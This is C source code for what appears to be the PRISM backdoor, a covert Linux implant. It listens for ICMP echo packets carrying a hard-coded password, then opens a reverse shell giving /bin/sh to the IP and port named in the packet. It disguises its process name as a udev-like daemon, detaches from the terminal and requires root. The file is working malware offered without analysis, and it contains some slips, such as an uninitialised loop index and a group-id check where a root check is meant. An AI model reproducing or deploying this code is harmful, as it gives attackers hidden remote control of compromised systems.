#include <stdio.h>
#include <sys/types.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <netdb.h>
#include <unistd.h>
#include <ctype.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <signal.h>

#ifdef STATIC
#define REVERSE_HOST    "10.0.0.1"
#define REVERSE_PORT    19832
#define RESPAWN_DELAY   15
#else
#define ICMP_PACKET_SIZE  1024
#define ICMP_KEY "p4ssw0rd"
#endif

#define VERSION      "0.5"
#define MOTD         "PRISM v"VERSION"  started\n\n# "
#define SHELL        "/bin/sh"
#define PROCESS_NAME "udevdlcz"

/*
 *Start the reverse shell 
 */
void start_reverse_shell(char *bd_ip,unsigned short int bd_port)
{
    int sd;
    struct sockaddr_in serv_addr;
    struct hostent *server;

    /* socket()*/
    sd=socket(AF_INET,SOCK_STREAM,0);
    if (sd<0)
        return;
    
    server=gethostbyname(bd_ip);
    if (server==NULL)
        return;

    bzero((char *) &serv_addr,sizeof(serv_addr));
    serv_addr.sin_family=AF_INET;
    bcopy((char *)server->h_addr,(char *)&serv_addr.sin_addr.s_addr,server->h_length);
    serv_addr.sin_port = htons(bd_port);

    /* connect*/
    if (connect(sd ,(struct sockaddr *) &serv_addr ,sizeof(serv_addr))<0)
        return;

    /* motd */
    write(sd,MOTD,strlen(MOTD));

    /* connect the socket to process stdout,stdin,stderr  */
    dup2(sd,0);
    dup2(sd,1);
    dup2(sd,2);
    
    /* running the shell  */
    execl(SHELL,SHELL,(char *)0);
    close(sd);
}


/*
 *ICMP packet mode
 * */
void icmp_listen(void)
{
    int sockfd,
        n,
        icmp_key_size;
    char buf[ICMP_PACKET_SIZE + 1];
    struct icmp *icmp;
    struct ip *ip;

    icmp_key_size=strlen(ICMP_KEY);
    sockfd = socket(AF_INET,SOCK_RAW,IPPROTO_ICMP);

    /*
     *Waiting for the activation ICMP packet 
     * */
    while (1){

        /* get the icmp packet */
        bzero(buf,ICMP_PACKET_SIZE+1);
        n=recv(sockfd,buf,ICMP_PACKET_SIZE,0);
        if (n>0){
            ip=(struct ip *)buf;
            icmp=(struct icmp * )(ip +1);
            
            /*If this is an ICMP_echo packet and if the key is corect  */
            if ((icmp->icmp_type==ICMP_ECHO)&&(memcmp(icmp->icmp_data,ICMP_KEY,icmp_key_size)==0))
            {
                char bd_ip[16];
                int bd_port;

                bd_port =0;
                bzero(bd_ip,sizeof(bd_ip));
                sscanf((char *)(icmp->icmp_data + icmp_key_size + 1),"%15s %d",bd_ip,&bd_port);

                if((bd_port <=0)||(strlen(bd_ip)<7))
                continue;

                /* Strating reverse shell */
                if (fork()==0){
                    printf("->Starting reverse shell (%s:%d)...\n",bd_ip,bd_port );
                    start_reverse_shell(bd_ip,bd_port);
                    exit(EXIT_SUCCESS);
                }
             }
         }
    }
}

/*
 * ICMP_KEY bd_ip bd_port 
struct icmp_bd {
    char passwd[ICMP_KEY_LEN];
    char ip[15];
    int port;
}
*
/*
 * main()
 * */
int main(int argc,char *argv[])
{
    printf("Hello world\n");
    signal(SIGCLD,SIG_IGN);//Prevent child process from becoming zombie process
    chdir("/");

    int i;
    /* Renaming the orocess  */
    strncpy(argv[i],PROCESS_NAME,strlen(argv[0]));
    for(i=1;i<argc;i++)
        memset(argv[i],' ',strlen(argv[i]));

    if (fork()!=0)
        exit(EXIT_SUCCESS);

    if(getgid()!=0){
        fprintf(stdout,"I'm not root:(\n");
        exit(EXIT_FAILURE);
    }
    icmp_listen();
    return(EXIT_SUCCESS);
}

